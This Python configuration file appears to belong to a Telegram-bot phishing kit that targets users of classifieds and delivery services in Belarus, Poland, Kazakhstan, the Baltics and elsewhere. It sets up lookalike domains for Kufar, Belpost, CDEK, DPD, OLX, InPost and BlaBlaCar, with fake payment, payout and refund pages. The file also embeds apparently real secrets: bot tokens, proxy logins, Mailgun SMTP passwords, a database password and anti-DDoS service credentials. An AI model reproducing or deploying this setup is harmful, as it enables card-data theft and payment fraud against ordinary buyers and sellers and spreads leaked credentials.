PL_DOMAIN_VARS = ['agtd', 'gbjs', 'igmr', 'conf']
COUNTRIES = {'🇧🇾 Беларусь': {'country': 'by', 'chat':-000, 'cur': 'BYN'}, '🇵🇹 Португалия': {'country': 'pt', 'chat': -000, 'cur': 'EUR'},
                 '🇵🇱 Польша': {'country': 'pl', 'chat': -000, 'cur': 'PLN'}, '🇱🇻 Латвия': {'country': 'lv', 'chat': -000, 'cur': 'EUR'},
                 '🇱🇹 Литва': {'country': 'lt', 'chat': -000, 'cur': 'EUR'}, '🇷🇴 Румыния': {'country': 'ro', 'chat': -000, 'cur': 'LEI'},
                 '🇸🇪 Швеция': {'country': 'sw', 'chat': -000, 'cur': 'KR'}, '🇪🇸 Испания': {'country': 'es', 'chat': -000, 'cur': 'EUR'},
                 '🌎 Booking': {'country':'bo', 'chat':-000, 'cur': 'EUR'}, '🇳🇱 Нидерланды': {'country': 'nl', 'chat': -000, 'cur': 'EUR'},
             '🇮🇹 Италия': {'country': 'it', 'chat': -000, 'cur': 'EUR'}}
API_TOKEN = '6463274771:AAGmh8Ze08VstPbFQolq-Ruo8-UA0r226H8'
HOSTNAME_AUTO_1 = 'https://autolight.payordered.icu/payment.php?q={}'
PRO_HOSTNAME_AUTO_1 = 'https://autolight.payordered.icu/payout.php?q={}'
HOSTNAME_AUTO_2 = 'https://autolight.payordered.icu/order/{}'
HOSTNAME_DPD = 'https://dpd.payordered.icu'
HOSTNAME_MD = 'https://999.payordered.icu/'
HOSTNAME_POSTA = 'https://posta.payordered.icu/'
HOSTNAME_AVITO = 'https://avito.payordered.icu/'
PRO_HOSTNAME_MD = 'https://999.payordered.icu/'
PRO_HOSTNAME_POSTA = 'https://posta.payordered.icu/'
PRO_HOSTNAME_AVITO = 'https://avito.payordered.icu/'
PRO_HOSTNAME_DPD = 'https://dpd.payordered.icu'
DPD2_PAY_URL = HOSTNAME_DPD + '/order/{}'
PRO_DPD2_PAY_URL = PRO_HOSTNAME_DPD + '/order/{}'
PRO_DPD2_PRO_URL = PRO_HOSTNAME_DPD + '/delivery/{}'
PRO_HOSTNAME_AUTO_2 = 'https://autolight.payordered.icu/order/{}'
PRO_HOSTNAME_AUTO_2_PRO = 'https://autolight.payordered.icu/delivery/{}'
HOSTNAME_KUFAR = 'https://kufar.payordered.icu/'
HOSTNAME_KUFAR2 = 'https://kufar.payordered.icu/'
HOSTNAME_KUFAR2_ERR = 'https://kufar.payordered.icu/'
HOSTNAME_KUFAR2_BAL = 'https://kufar.payordered.icu/'
HOSTNAME_KUFAR2_PRO = 'https://kufar.payordered.icu/'
HOSTNAME_NEDVIG2 = 'https://re.kufar.payordered.icu/'
HOSTNAME_NEDVIG = 'https://re.kufar.payordered.icu/'
HOSTNAME_SDEK = 'https://cdek.payordered.icu/'
HOSTNAME_BELPOST = 'https://belpost.payordered.icu'
HOSTNAME_EVRO = 'https://evropochta.payordered.icu/'
HOSTNAME_BLA_2 = 'https://blablacar.services/order/{}'
HOSTNAME_BLA_PAY = 'https://blablacar.services/payment.php?q={}'
HOSTNAME_BLA_REFUND = 'https://blablacar.services/return.php?q={}'
PRO_HOSTNAME_BLA_2 = 'https://blablacar.vc/delivery/{}'
PRO_HOSTNAME_BLA_PAY = 'https://blablacar.vc/payout.php?q={}'
PRO_HOSTNAME_BLA_REFUND = 'https://blablacar.vc/refund.php?q={}'
PRO_HOSTNAME_KUFAR = 'https://kufar.payordered.icu/'
PRO_HOSTNAME_KUFAR2 = 'https://kufar.payordered.icu/'
PRO_HOSTNAME_KUFAR2_ERR = 'https://kufar.payordered.icu/'
PRO_HOSTNAME_KUFAR2_BAL = 'https://kufar.payordered.icu/'
PRO_HOSTNAME_KUFAR2_PRO = 'https://kufar.payordered.icu/'
PRO_HOSTNAME_NEDVIG2 = 'https://re.kufar.payordered.icu/'
PRO_HOSTNAME_NEDVIG = 'https://re.kufar.payordered.icu/'
PRO_HOSTNAME_SDEK = 'https://cdek.payordered.icu/'
PRO_HOSTNAME_BELPOST = 'https://belpost.payordered.icu'
PRO_HOSTNAME_EVRO = 'https://evropochta.payordered.icu/'
BELPOST_SAFE_URL = HOSTNAME_BELPOST + '/BezopasnayaSdelka'
SDEK_SAFE_URL = HOSTNAME_SDEK + 'bezopasnaya_sdelka'
SDEK_PAYMENT_URL = HOSTNAME_SDEK + 'pay?id={}'
SDEK_REFUND_URL = HOSTNAME_SDEK + 'ref?id={}'
SDEK_TRACK_URL = HOSTNAME_SDEK + 'payment.php?q={}'
SDEK_CHECK_URL = HOSTNAME_SDEK + 'tracking'
SDEK2_PAY_URL = HOSTNAME_SDEK + 'order/{}'
SDEK2_ERR_URL = HOSTNAME_SDEK + 'getpayment?id={}'
SDEK2_BAL_URL = HOSTNAME_SDEK + 'receive?id={}'
SDEK2_PRO_URL = HOSTNAME_SDEK + 'getpayments/order?q={}'
BELPOST2_PAY_URL = HOSTNAME_BELPOST + '/order/{}'
BELPOST2_ERROR_URL = HOSTNAME_BELPOST + '/delivery?id={}'
BELPOST2_BAL_URL = HOSTNAME_BELPOST + '/getpay?id={}'
BELPOST2_PRO_URL = HOSTNAME_BELPOST + '/getpayment/order?q={}'
PRO_BELPOST_SAFE_URL = PRO_HOSTNAME_BELPOST + '/BezopasnayaSdelka'
PRO_SDEK_SAFE_URL = PRO_HOSTNAME_SDEK + 'bezopasnaya_sdelka'
PRO_SDEK_PAYMENT_URL = PRO_HOSTNAME_SDEK + 'pay?id={}'
PRO_SDEK_REFUND_URL = PRO_HOSTNAME_SDEK + 'ref?id={}'
PRO_SDEK_TRACK_URL = PRO_HOSTNAME_SDEK + 'payout.php?q={}'
PRO_SDEK_CHECK_URL = PRO_HOSTNAME_SDEK + 'tracking'
PRO_SDEK2_PAY_URL = PRO_HOSTNAME_SDEK + 'order/{}'
PRO_SDEK2_ERR_URL = PRO_HOSTNAME_SDEK + 'getpayment?id={}'
PRO_SDEK2_BAL_URL = PRO_HOSTNAME_SDEK + 'receive?id={}'
PRO_SDEK2_PRO_URL = PRO_HOSTNAME_SDEK + 'delivery/{}'
PRO_BELPOST2_PAY_URL = PRO_HOSTNAME_BELPOST + '/order/{}'
PRO_BELPOST2_ERROR_URL = PRO_HOSTNAME_BELPOST + '/delivery?id={}'
PRO_BELPOST2_BAL_URL = PRO_HOSTNAME_BELPOST + '/getpay?id={}'
PRO_BELPOST2_PRO_URL = PRO_HOSTNAME_BELPOST + '/delivery/{}'
PRO_DPD2_PAY2_URL = PRO_HOSTNAME_DPD + '/getpay/{}'
HOSTNAME_AUTO2_2 = 'https://autolight.payordered.icu/getpay/{}'
PRO_HOSTNAME_AUTO2_2 = 'https://autolight.payordered.icu/getpay/{}'
DPD2_PAY2_URL = HOSTNAME_DPD + '/getpay/{}'
SDEK2_PAY2_URL = HOSTNAME_SDEK + 'getpay/{}'
BELPOST2_PAY2_URL = HOSTNAME_BELPOST + '/getpay/{}'
PRO_SDEK2_PAY2_URL = PRO_HOSTNAME_SDEK + 'getpay/{}'
PRO_BELPOST2_PAY2_URL = PRO_HOSTNAME_BELPOST + '/getpay/{}'
PROXIES = {'http': 'http://SwopFV:8gSfg6@45.129.171.205:8000', 'https': 'http://SwopFV:8gSfg6@45.129.171.205:8000'}
ADMIN_IDS = [2133794189]
CHANNEL_ID =  -1001724619294
REPORT_ID = 2133794189
SMS_TOKEN = '11c66e43f43766c7c90906fc6a01f64a'
SMS_DEVICE = '256463'
MONEY_CHANNEL = [-1001724619294]
ERROR_CHANNEL = -1001724619294
DOMAIN_CHANNEL = -1001724619294

REDIS_HOST = "127.0.0.1"
REDIS_PORT = 6379
REDIS_PASS ='000'
REDIS_DB = 0

POSTGRES_HOST = "localhost"
POSTGRES_PORT = 5432
POSTGRES_USER = 'john'
POSTGRES_PASS = 'adidas491'
POSTGRES_DB = 'john'
POSTGRES_URI = f"postgresql://{POSTGRES_USER}:{POSTGRES_PASS}@{POSTGRES_HOST}:{POSTGRES_PORT}/{POSTGRES_DB}"

WEBHOOK_HOST = 'https://evropochta.moblie.by/'
WEBHOOK_PATH = '954720646:AAEkt0dh1pDmgB5Z6BEvezU508Er5FRARSg/'
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"

# web server settings
WEBAPP_HOST = '127.0.0.1'  # or ip
WEBAPP_PORT = 3050

EN_LVL2_CHAT = -1001724619294
LVL2_CHAT = -1001724619294
LVL1_CHAT = -1001724619294
ES_LVL2_CHAT = -1001724619294
KZ_LVL2_CHAT = -1001724619294
KZ_LVL1_CHAT = -1001724619294

KUFAR_EMAIL = 'postmaster@getpay.by'
KUFAR_EMAIL_PASSWORD = '9e126759d062f1cc46e12af9443408ef-3d0809fb-a320b127'
KUFAR_EMAIL_HOST = 'smtp.eu.mailgun.org'
KUFAR_EMAIL_PORT = 465
KUFAR_EMAIL_FROM = 'info@getpay.by'

BELPOST_EMAIL = 'postmaster@getpay.by'
BELPOST_EMAIL_PASSWORD = '9e126759d062f1cc46e12af9443408ef-3d0809fb-a320b127'
BELPOST_EMAIL_HOST = 'smtp.eu.mailgun.org'
BELPOST_EMAIL_PORT = 465
BELPOST_EMAIL_FROM = 'info@getpay.by'

EVRO_EMAIL = 'postmaster@getpay.by'
EVRO_EMAIL_PASSWORD = '9e126759d062f1cc46e12af9443408ef-3d0809fb-a320b127'
EVRO_EMAIL_HOST = 'smtp.eu.mailgun.org'
EVRO_EMAIL_PORT = 465
EVRO_EMAIL_FROM = 'info@getpay.by'

SDEK_EMAIL = 'postmaster@getpay.by'
SDEK_EMAIL_PASSWORD = '9e126759d062f1cc46e12af9443408ef-3d0809fb-a320b127'
SDEK_EMAIL_HOST = 'smtp.eu.mailgun.org'
SDEK_EMAIL_PORT = 465
SDEK_EMAIL_FROM = 'info@getpay.by'

SMS_ENABLED = False

PRO_DPD2_PAY3_URL = PRO_HOSTNAME_DPD + '/ref/{}'
HOSTNAME_AUTO2_3 = 'https://autolight.payordered.icu/ref/{}'
PRO_HOSTNAME_AUTO2_3 = 'https://autolight.payordered.icu/ref/{}'
DPD2_PAY3_URL = HOSTNAME_DPD + '/ref/{}'
SDEK2_PAY3_URL = HOSTNAME_SDEK + 'ref/{}'
BELPOST2_PAY3_URL = HOSTNAME_BELPOST + '/ref/{}'
PRO_SDEK2_PAY3_URL = PRO_HOSTNAME_SDEK + 'ref/{}'
PRO_BELPOST2_PAY3_URL = PRO_HOSTNAME_BELPOST + '/ref/{}'
SMS_HOSTNAME_BELPOST = 'order.belpost.by'
SMS_HOSTNAME_EVRO = 'order.evro.by'
SMS_HOSTNAME_SDEK = 'order.sdek.by'
SMS_HOSTNAME_KUFAR = 'order.kufar.by'

PROXY = 'http://TMrs7XTM:4PniA62Y@193.5.28.170:59666'
PROXY = 'http://C1GKk8vK:j9VzmQFH@45.138.159.24:56689'
MD_EMAIL = 'postmaster@999-pay.me'
MD_EMAIL_PASSWORD = '82acf955b904911252f1d995e7c3396b-e5da0167-78e248c4'
MD_EMAIL_HOST = 'smtp.eu.mailgun.org'
MD_EMAIL_PORT = 465
MD_EMAIL_FROM = 'info@999-pay.me'

SAFE_EMAIL = 'postmaster@safepayment.me'
SAFE_EMAIL_PASSWORD = '24e8143c87b6f6b3436c143cbd5bc51e-e5da0167-74910cda'
SAFE_EMAIL_HOST = 'smtp.eu.mailgun.org'
SAFE_EMAIL_PORT = 465
SAFE_EMAIL_FROM = 'info@safepayment.me'

HOSTNAME_KZSDEK = 'https://cdek.safepayment.kz/'
PRO_HOSTNAME_KZSDEK = 'https://cdek.safepayment.kz/'
HOSTNAME_OLX = 'https://olx.safepayment.kz/'
PRO_HOSTNAME_OLX = 'https://olx.safepayment.kz/'
HOSTNAME_KAZPOST = 'https://post.safepayment.kz/'
PRO_HOSTNAME_KAZPOST = 'https://post.safepayment.kz/'
HOSTNAME_DHL = 'https://dhl.safepayment.kz/'
PRO_HOSTNAME_DHL = 'https://dhl.safepayment.kz/'

KZ_EMAIL = 'postmaster@safepayment.kz'
KZ_EMAIL_PASSWORD = 'c00ad74f98565c1b8f504ba4ce93981e-b6190e87-d12f80d5'
KZ_EMAIL_HOST = 'smtp.eu.mailgun.org'
KZ_EMAIL_PORT = 465
KZ_EMAIL_FROM = 'info@safepayment.kz'

PL_HOSTNAME_INPOST = 'http://inpost.pl-getdelivery.link/'
PL_PRO_HOSTNAME_INPOST = 'http://inpost.pl-getdelivery.link/'
PL_PRO_HOSTNAME_OLX = 'http://olx.pl-getdelivery.link/'
PL_HOSTNAME_OLX = 'http://olx.pl-getdelivery.link/'
PL_HOSTNAME_PLPOST = 'https://poczta.pl-getdelivery.link/'
PL_PRO_HOSTNAME_PLPOST = 'https://poczta.pl-getdelivery.link/'

UA_HOSTNAME_OLX = 'https://olx.payordered.icu/'
LV_DPD_HOSTNAME = 'https://dpdlv.payordered.icu/'
LV_OM_HOSTNAME = 'https://omnivalv.payordered.icu/'
LT_DPD_HOSTNAME = 'https://dpdlt.payordered.icu/'
LT_OM_HOSTNAME = 'https://omnivalt.payordered.icu/'
HOSTNAME_JOF = 'https://jofogas.payordered.icu/'
PRO_HOSTNAME_JOF = 'https://jofogas.payordered.icu/'

PL_EMAIL = 'postmaster@pl-online.link'
PL_EMAIL_PASSWORD = '0d929893ce4460d11521002b293c2e36-28d78af2-acf46faa'
PL_EMAIL_HOST = 'smtp.eu.mailgun.org'
PL_EMAIL_PORT = 465
PL_EMAIL_FROM = 'info@pl-online.link'
PL_LVL2_CHAT = -1001598056327
PL_LVL1_CHAT = -000
CZ_SBAZAR_HOSTNAME = 'payordered.icu'
ES_COR_HOSTNAME = 'payordered.icu'

DDOS_LOGIN = 'c0verme'
DDOS_PASS = 'eSsOGiBXkNDl'

REGRU_USER = '000'
REGRU_PASS = '000'
REGRU_PROXY = 'http://Q6mtf5TWbS:4uKihOHVtv@45.146.27.231:48303'

BY_DOMAIN = 'pay-get.by'
KUFAR_DOMAIN = 'kufarpay.by'
GUARD_API = '3ed9d09b8bf781b7df57ba20e9ee8639'
GUARD_CID = 210419
GUARD_SID = 78039
GUARD_PROXY = 'http://Q6mtf5TWbS:4uKihOHVtv@77.83.80.6:58849'
NOTIFY_CHANNEL = -000
STORMWALL_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjAwMDEifQ.eyJ1aWQiOjk5NTUsInF0IjoiYXBpIiwiaWF0IjoxNjI3MzE1MTE2LCJleHAiOjE2MzUwOTExMTYsImlzcyI6IlN0b3Jtd2FsbCIsInN1YiI6IjIyYWU3Mzk3LWQ1YzgtNDZhNS04ZDVkLWMxMjExODJlNjMxMiJ9.Hz1FpBwCZABRnHE22_mbm45ZwZYKTsZIo9w0r5YHAX0'
REGRU_IP = '45.9.20.88'
